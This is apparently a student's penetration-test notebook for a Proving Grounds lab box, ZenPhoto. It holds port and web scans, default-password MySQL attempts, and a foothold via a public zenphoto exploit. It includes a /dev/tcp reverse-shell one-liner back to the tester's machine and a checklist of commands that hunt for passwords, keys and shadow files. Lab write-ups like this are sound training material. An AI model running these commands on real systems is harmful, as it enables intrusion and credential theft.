**Metadata**

- IP Address:  192.168.162.41
- Hostname: 
- OS: 	Ubuntu
- Found Credentials/Users:

Main Objectives:

Local.txt = 90f7dc29c301d2478ebd085cee8f1e46
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.162.41 -oN - 
# Nmap 7.95 scan initiated Sun Jan 18 10:24:44 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.162.41
Nmap scan report for 192.168.162.41
Host is up (0.086s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.41 -oN /home/kali/ProvingGround/ZenPhoto/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/ZenPhoto/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 10:24 MST
Nmap scan report for 192.168.162.41
Host is up (0.085s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.41 -oN /home/kali/ProvingGround/ZenPhoto/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/ZenPhoto/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 10:37 MST
Warning: 192.168.162.41 giving up on port because retransmission cap hit (1).
Nmap scan report for 192.168.162.41
Host is up (0.080s latency).
Skipping host 192.168.162.41 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1203.43 seconds

```

2. Interesting Ports/Services

```

```

3. SSH Enumeration

```
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)


```

3. Telnet Enumeration

```
23/tcp   open  ipp     CUPS 1.4
https://www.exploit-db.com/exploits/34152

23/tcp   open  ssl/ipp CUPS 1.4
|_http-title: 403 Forbidden
|_ssl-date: 2026-01-18T22:58:57+00:00; +5h00m03s from scanner time.
| http-methods: 
|_  Potentially risky methods: PUT
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2011-11-08T07:15:46
|_Not valid after:  2021-11-05T07:15:46
|_http-server-header: CUPS/1.4

telnet 192.168.162.41
Trying 192.168.162.41...
Connected to 192.168.162.41.
Escape character is '^]'.
Connection closed by foreign host.


```

4. Web Enumeration 

```
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)

Webserver Info - Apache httpd 2.2.14 
Applications Running -
1. zenphoto version 1.4.1.4

Site Visit - 
1. Site say under construction. 
2. Found http://192.168.162.41/test/zp-core/admin.php
   
Possible Vulmerabilities - 
3. https://www.exploit-db.com/exploits/18083
   
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.162.41:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/ZenPhoto/gobuster/ZenPhoto_192.168.162.41_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.41:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 291]
/cgi-bin/             (Status: 403) [Size: 290]
/.hta                 (Status: 403) [Size: 286]
/index                (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/test                 (Status: 301) [Size: 315] [--> http://192.168.162.41/test/]
/server-status        (Status: 403) [Size: 295]

[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.162.41:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/ZenPhoto/gobuster/ZenPhoto_192.168.162.41_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.41:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 75]
/test                 (Status: 301) [Size: 315] [--> 
/server-status        (Status: 403) [Size: 295]
Progress: 220460 / 220558 (99.96%)
===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.162.41:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/ZenPhoto/gobuster/ZenPhoto_192.168.162.41_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.41:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              jsp,html,txt,bak,zip,php,asp,aspx,old,tar,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 286]
/.hta.bak             (Status: 403) [Size: 290]
/.hta.jsp             (Status: 403) [Size: 290]
/.hta.html            (Status: 403) [Size: 291]
/.hta.php             (Status: 403) [Size: 290]
/.hta.zip             (Status: 403) [Size: 290]
/.hta.txt             (Status: 403) [Size: 290]
/.hta.old             (Status: 403) [Size: 290]
/.hta.asp             (Status: 403) [Size: 290]
/.hta.aspx            (Status: 403) [Size: 291]
/.hta.tar             (Status: 403) [Size: 290]
/.hta.tar.gz          (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 291]
/.htaccess.bak        (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 295]
/.htpasswd.zip        (Status: 403) [Size: 295]
/.htpasswd.aspx       (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 291]
/.htpasswd.old        (Status: 403) [Size: 295]
/.htaccess.txt        (Status: 403) [Size: 295]
/.htaccess.jsp        (Status: 403) [Size: 295]
/.htaccess.tar.gz     (Status: 403) [Size: 298]
/.htpasswd.asp        (Status: 403) [Size: 295]
/.htaccess.html       (Status: 403) [Size: 296]
/.htaccess.zip        (Status: 403) [Size: 295]
/.htpasswd.jsp        (Status: 403) [Size: 295]
/.htpasswd.tar        (Status: 403) [Size: 295]
/.htpasswd.txt        (Status: 403) [Size: 295]
/.htpasswd.html       (Status: 403) [Size: 296]
/.htpasswd.tar.gz     (Status: 403) [Size: 298]
/.htaccess.aspx       (Status: 403) [Size: 296]
/.htpasswd.bak        (Status: 403) [Size: 295]
/.htaccess.asp        (Status: 403) [Size: 295]
/.htaccess.tar        (Status: 403) [Size: 295]
/.htaccess.old        (Status: 403) [Size: 295]
/.htaccess.php        (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 290]
/cgi-bin/.html        (Status: 403) [Size: 295]
/index                (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/server-status        (Status: 403) [Size: 295]
/test                 (Status: 301) [Size: 315] [--> http://192.168.162.41/test/]
Progress: 55190 / 55356 (99.70%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.162.41:80 -output /home/kali/ProvingGround/ZenPhoto/web/192.168.162.41_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.41
+ Target Hostname:    192.168.162.41
+ Target Port:        80
+ Start Time:         2026-01-18 10:53:04 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.2.14 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 135479, size: 75, mtime: Wed Nov  9 04:30:14 2011. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
T+ /test/: Cookie zenphoto_auth created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /test/: Cookie zenphoto_ssl created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /test/: Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.10.
+ /test/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2026-01-18 11:05:25 (GMT-7) (741 seconds)


```

5. MSQL Enumeration

```
nmap -p 3306 -sV -sC 192.168.162.41

nmap -p 3306 --script=mysql-info,mysql-enum,mysql-databases,mysql-users,mysql-variables,mysql-empty-password,mysql-brute <target>

mysql -h 192.168.162.41 -u root -p                             
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u root --password=""
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u admin -padmin
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u test -ptest
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u root -proot

ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u root -ppassword
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u '' --password=''
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

```

6. Possible Exploits

```
 https://www.exploit-db.com/exploits/18083
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps
- Downloaded exploit from  https://www.exploit-db.com/exploits/18083.
- Viewed usage	

![[Pasted image 20260118165905.png]]

- Ran the exploit and received shell

```
php 18083.php 192.168.162.41 /test/
```

![[Pasted image 20260118170056.png]]

- Upgraded shell using Penelope by sending reverse shell back to my Kali machine.

```
zenphoto-shell# 0<&196;exec 196<>/dev/tcp/192.168.45.151/443; bash <&196 >&196 2>&196

```

![[Pasted image 20260118170405.png]]

2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
whoami

id

hostname

pwd

uname -a

cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null

```

2. Environment

```
env

set 2>/dev/null | head -n 50

echo "$PATH"

echo "HOME=$HOME"; echo "SHELL=$SHELL"

```

3. User & Home Directories

```
cat /etc/passwd

ls -la /home

ls -la /root 2>/dev/null

sudo -l 2>/dev/null

sudo -V 2>/dev/null | head -n 10
```

4. Writable Paths & Permissions

```
find / -writable -type d 2>/dev/null | head -n 50

find / -writable -type f 2>/dev/null | head -n 50

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done

find / -user "$(id -un)" -type f 2>/dev/null | head -n 50

ls -l /etc/passwd 2>/dev/null

ls -l /etc/shadow 2>/dev/null

ls -la / 2>/dev/null

```

4. SUID / SGID / Capabilities

```
find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null

getcap -r / 2>/dev/null

```

5. Cron & Scheduled Tasks

```
cat /etc/crontab 2>/dev/null

ls -la /etc/cron.* 2>/dev/null

crontab -l 2>/dev/null
```

6. Processes & Network

```
ps aux

ps -ef

ss -tulwn 2>/dev/null

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
grep -R "password" /etc 2>/dev/null | head -n 50

ls -la /var/www 2>/dev/null

grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

find /home -type f -name "*.txt" 2>/dev/null

find /home -type f -name "*history*" 2>/dev/null

find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
```

9.  Containers / Virtualization

```
ls -la /.dockerenv 2>/dev/null

grep -i docker /proc/1/cgroup 2>/dev/null
```

10. Possible PE Paths

```

```

**Privilege Escalation**

1. PE Steps

```

```

2. Notes

```

```

